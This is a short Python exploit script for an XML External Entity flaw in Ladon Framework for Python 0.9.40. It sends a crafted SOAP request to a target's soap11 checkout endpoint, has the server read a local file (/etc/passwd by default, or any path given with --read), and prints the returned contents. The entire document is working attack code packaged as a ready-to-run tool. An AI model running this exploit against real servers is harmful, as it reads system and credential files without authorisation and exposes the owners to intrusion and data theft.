#!/usr/bin/python3

import requests
import argparse
import xml.dom.minidom






def main():
    parser = argparse.ArgumentParser(description='Ladon Framework for Python 0.9.40 - XML External Entity Expansion ')
    parser.add_argument('--lhost', '-l', dest='domain', default='localhost')
    parser.add_argument('--apppath', '-a', dest='app_name', default='firstapp')
    parser.add_argument('--read', '-r', dest='read_file', default='/etc/passwd')
    args = parser.parse_args()


    all_headers = {'Content-Type' : 'text/xml;charset=UTF-8', 'SOAPAction' : f"http://{args.domain}:8888/{args.app_name}/soap11/checkout" }

    xml_data = f"""<?xml version="1.0"?> 
    <!DOCTYPE uid 
    [<!ENTITY passwd SYSTEM "file://{args.read_file}">
    ]> 
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:urn="urn:HelloService"><soapenv:Header/>
    <soapenv:Body>
    <urn:checkout soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <uid xsi:type="xsd:string">&passwd;</uid>
    </urn:checkout>
    </soapenv:Body>
    </soapenv:Envelope>
    """


    url = f"http://{args.domain}:8888/{args.app_name}/soap11"


    encoded_xml = xml_data.encode()

    data = requests.post(url, headers= all_headers ,data=encoded_xml)

    
    if (data.status_code ==200):
        dom = xml.dom.minidom.parseString(data.text)
        pretty_xml_as_string = dom.toprettyxml()
        print(pretty_xml_as_string)

    else:
        print( "File may not be readable or may not exist")





if __name__ == '__main__':
    main()
